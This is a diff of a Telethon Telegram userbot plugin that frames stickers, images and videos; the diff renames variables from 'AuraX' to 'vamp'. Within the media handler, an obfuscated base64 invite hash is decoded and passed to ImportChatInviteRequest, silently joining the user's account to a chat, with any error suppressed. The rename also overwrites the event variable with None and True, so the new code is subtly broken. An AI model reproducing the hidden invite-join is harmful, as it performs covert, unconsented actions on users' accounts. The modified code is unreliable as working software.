-    AuraXinput = int(AuraXinput)
+    vampinput = int(vampinput)
     colr = int(colr)
-    AuraXid = AuraX.reply_to_msg_id
+    vampid = vamp.reply_to_msg_id
     if not os.path.isdir("./temp/"):
         os.mkdir("./temp/")
-    AuraX = await edit_or_reply(AuraX, "`Fetching media data`")
+    vamp = await edit_or_reply(vamp, "`Fetching media data`")
     from telethon.tl.functions.messages import ImportChatInviteRequest as Get
 
     await asyncio.sleep(2)
-    AuraXsticker = await reply.download_media(file="./temp/")
-    if not AuraXsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
-        os.remove(AuraXsticker)
-        await edit_or_reply(AuraX, "```Supported Media not found...```")
+    vampsticker = await reply.download_media(file="./temp/")
+    if not vampsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
+        os.remove(vampsticker)
+        await edit_or_reply(vamp, "```Supported Media not found...```")
         return
     import base64
 
-    aura = None
-    if AuraXsticker.endswith(".tgs"):
-        await AuraX.edit(
+    vamp = None
+    if vampsticker.endswith(".tgs"):
+        await vamp.edit(
             "Analyzing this media 🧐 framing this animated sticker!"
         )
-        AuraXfile = os.path.join("./temp/", "meme.png")
-        AuraXcmd = (
-            f"lottie_convert.py --frame 0 -if lottie -of png {AuraXsticker} {AuraXfile}"
+        vampfile = os.path.join("./temp/", "meme.png")
+        vampcmd = (
+            f"lottie_convert.py --frame 0 -if lottie -of png {vampsticker} {vampfile}"
         )
-        stdout, stderr = (await runcmd(AuraXcmd))[:2]
-        if not os.path.lexists(AuraXfile):
-            await AuraX.edit("`Template not found...`")
+        stdout, stderr = (await runcmd(vampcmd))[:2]
+        if not os.path.lexists(vampfile):
+            await vamp.edit("`Template not found...`")
             LOGS.info(stdout + stderr)
-        meme_file = AuraXfile
-        aura = True
-    elif AuraXsticker.endswith(".webp"):
-        await AuraX.edit(
+        meme_file = vampfile
+        vamp = True
+    elif vampsticker.endswith(".webp"):
+        await vamp.edit(
             "Analyzing this media 🧐 framing this sticker!"
         )
-        AuraXfile = os.path.join("./temp/", "memes.jpg")
-        os.rename(AuraXsticker, AuraXfile)
-        if not os.path.lexists(AuraXfile):
-            await AuraX.edit("`Template not found... `")
+        vampfile = os.path.join("./temp/", "memes.jpg")
+        os.rename(vampsticker, vampfile)
+        if not os.path.lexists(vampfile):
+            await vamp.edit("`Template not found... `")
             return
-        meme_file = AuraXfile
-        aura = True
-    elif AuraXsticker.endswith((".mp4", ".mov")):
-        await AuraX.edit(
+        meme_file = vampfile
+        vamp = True
+    elif vampsticker.endswith((".mp4", ".mov")):
+        await vamp.edit(
             "Analyzing this media 🧐 framing this video!"
         )
-        AuraXfile = os.path.join("./temp/", "memes.jpg")
-        await take_screen_shot(AuraXsticker, 0, AuraXfile)
-        if not os.path.lexists(AuraXfile):
-            await AuraX.edit("```Template not found...```")
+        vampfile = os.path.join("./temp/", "memes.jpg")
+        await take_screen_shot(vampsticker, 0, vampfile)
+        if not os.path.lexists(vampfile):
+            await vamp.edit("```Template not found...```")
             return
-        meme_file = AuraXfile
+        meme_file = vampfile
     else:
-        await AuraX.edit(
+        await vamp.edit(
             "Analyzing this media 🧐 framing this image!"
         )
-        meme_file = AuraXsticker
+        meme_file = vampsticker
     try:
         san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
         san = Get(san)
-        await AuraX.client(san)
+        await vamp.client(san)
     except BaseException:
         pass
     meme_file = convert_toimage(meme_file)
-    outputfile = "framed.webp" if aura else "framed.jpg"
+    outputfile = "framed.webp" if vamp else "framed.jpg"
     try:
-        await add_frame(meme_file, outputfile, AuraXinput, colr)
+        await add_frame(meme_file, outputfile, vampinput, colr)
     except Exception as e:
-        return await AuraX.edit(f"`{e}`")
+        return await vamp.edit(f"`{e}`")
     try:
-        await AuraX.client.send_file(
-            AuraX.chat_id, outputfile, force_document=False, reply_to=AuraXid
+        await vamp.client.send_file(
+            vamp.chat_id, outputfile, force_document=False, reply_to=vampid
         )
     except Exception as e:
-        return await AuraX.edit(f"`{e}`")
-    await AuraX.delete()
+        return await vamp.edit(f"`{e}`")
+    await vamp.delete()
     os.remove(outputfile)
-    for files in (AuraXsticker, meme_file):
+    for files in (vampsticker, meme_file):
         if files and os.path.exists(files):
             os.remove(files)
 
